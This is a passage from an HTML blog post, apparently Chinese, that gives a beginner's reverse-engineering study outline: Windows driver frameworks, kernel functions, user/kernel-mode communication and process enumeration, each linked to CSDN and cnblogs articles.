        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>鉴于很多同学想学习 <font color="red"><strong>逆向工程</strong></font>，但是找不到切入点导致无从入手，因此编写了这个指引清单。</p><p>本文原则上只是一个<font color="red">学习指引目录</font>（虽然部分章节有提供一些资料），因涉及知识面太多，具体内容以后再逐渐填充。</p><p>有兴趣的同学可根据指引清单，先行逐步扩展学习每个知识点。当整个清单都弄懂了，也就入门了（<strong>对的，你没看错，只是入门</strong>）。</p><h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h2><h3 id="1-1-驱动框架（NT和WDM）"><a href="#1-1-驱动框架（NT和WDM）" class="headerlink" title="1.1. 驱动框架（NT和WDM）"></a>1.1. 驱动框架（NT和WDM）</h3><ul><li>《<a href=" http://blog.csdn.net/msk10k/article/details/51226666" target="_blank" rel="nofollow">NT - WDM - WDF 驱动概念</a>》</li></ul><h3 id="1-2-驱动基础（编程概念、内核函数、基本数据结构等等）"><a href="#1-2-驱动基础（编程概念、内核函数、基本数据结构等等）" class="headerlink" title="1.2. 驱动基础（编程概念、内核函数、基本数据结构等等）"></a>1.2. 驱动基础（编程概念、内核函数、基本数据结构等等）</h3><ul><li>《<a href="http://blog.csdn.net/erin45/article/details/7401678" target="_blank" rel="nofollow">WDM驱动程序的基本结构和实例</a>》</li><li>《<a href="http://blog.csdn.net/huangxy10/article/details/15307061" target="_blank" rel="nofollow">Windows驱动开发常用的数据结构</a>》</li><li>《<a href="http://blog.csdn.net/baggiowangyu/article/details/7936414" target="_blank" rel="nofollow">内存管理</a>》</li><li>《<a href="http://blog.csdn.net/whw8007/article/details/8865231" target="_blank" rel="nofollow">CE驱动开发常用宏定义</a>》</li><li>《<a href="http://blog.csdn.net/chenlycly/article/details/52777707" target="_blank" rel="nofollow">windows 内核函数前缀解析</a>》</li><li>《<a href="http://blog.csdn.net/lanuage/article/details/53413391" target="_blank" rel="nofollow">Windows常用内核函数</a>》</li></ul><h3 id="1-3-驱动通信（R3主动与R0通信、R0主动与R3交互）"><a href="#1-3-驱动通信（R3主动与R0通信、R0主动与R3交互）" class="headerlink" title="1.3. 驱动通信（R3主动与R0通信、R0主动与R3交互）"></a>1.3. 驱动通信（R3主动与R0通信、R0主动与R3交互）</h3><ul><li>R3：用户层</li><li>R0：内核层</li><li>《<a href="http://www.cnblogs.com/pcajax/archive/2011/03/16/1986407.html" target="_blank" rel="nofollow">ring0和ring3的区别</a>》</li></ul><h3 id="1-4-基本操作（系统线程、工作队列、计时器、字符串、内存、链表等等等等）"><a href="#1-4-基本操作（系统线程、工作队列、计时器、字符串、内存、链表等等等等）" class="headerlink" title="1.4. 基本操作（系统线程、工作队列、计时器、字符串、内存、链表等等等等）"></a>1.4. 基本操作（系统线程、工作队列、计时器、字符串、内存、链表等等等等）</h3><p>……</p><h2 id="2-进程相关"><a href="#2-进程相关" class="headerlink" title="2. 进程相关"></a>2. 进程相关</h2><h3 id="2-1-枚举进程（PID、EPROCESS、进程路径等）"><a href="#2-1-枚举进程（PID、EPROCESS、进程路径等）" class="headerlink" title="2.1. 枚举进程（PID、EPROCESS、进程路径等）"></a>2.1. 枚举进程（PID、EPROCESS、进程路径等）</h3><ul><li>《<a href="http://blog.csdn.net/yangluoning/article/details/14647969" target="_blank" rel="nofollow">四种方法实现VC枚举系统当前进程</a>》</li><li>《<a href="http://blog.csdn.net/zhongbin104/article/details/7867309" target="_blank" rel="nofollow">C